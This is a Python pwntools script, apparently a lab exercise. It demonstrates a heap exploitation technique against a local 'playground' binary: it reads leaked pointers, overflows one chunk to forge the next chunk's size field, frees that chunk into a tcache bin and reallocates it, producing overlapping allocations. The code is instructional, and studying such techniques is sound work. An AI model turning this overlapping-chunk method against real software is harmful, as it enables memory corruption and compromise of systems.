#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"stack_ptr: {stack_ptr:#x}")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"data_ptr: {data_ptr:#x}")

    # three contiguous allocations
    p.clean()
    p.sendline(b"malloc 0x100")
    p.recvuntil(b"[*]")
    ptr1 = int(p.recvline()[:-1], 16)
    print(f"ptr1: {ptr1:#x}")

    p.clean()
    p.sendline(b"malloc 0x100")
    p.recvuntil(b"[*]")
    ptr2 = int(p.recvline()[:-1], 16)
    print(f"ptr2: {ptr2:#x}")

    p.clean()
    p.sendline(b"malloc 0x100")
    p.recvuntil(b"[*]")
    ptr3 = int(p.recvline()[:-1], 16)
    print(f"ptr3: {ptr3:#x}")

    print("ready to overwrite chunk metadata.")

    # let's simulate an overflow in ptr1 that allows us
    # to overwrite chunk metadata in ptr2
    payload = (
            b"A"*0x100 +        # padding
            pwn.p64(0x0) +      # prev size
            pwn.p64(0x221)      # fake size + P flag
    )
    p.sendline(f"write {ptr1:#x} {len(payload):#x}".encode())
    p.sendline(payload)

    # let's now free the corrupted allocation
    # this chunk will be sent to tcache 0x220
    p.sendline(f"free {ptr2:#x}".encode())

    # request an allocation that matches that bin
    p.clean()
    p.sendline(b"malloc 0x210")
    p.recvuntil(b"[*]")
    ptr4 = int(p.recvline()[:-1], 16)
    print(f"malloc(0x210) = ptr4 = {ptr4:#x}")

    input("done. allocation 4 is overlapping now allocation 3, any content in allocation 3" +
          " can be accessed or overwritten from allocation 4")


def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)


if __name__ == "__main__":
    main()
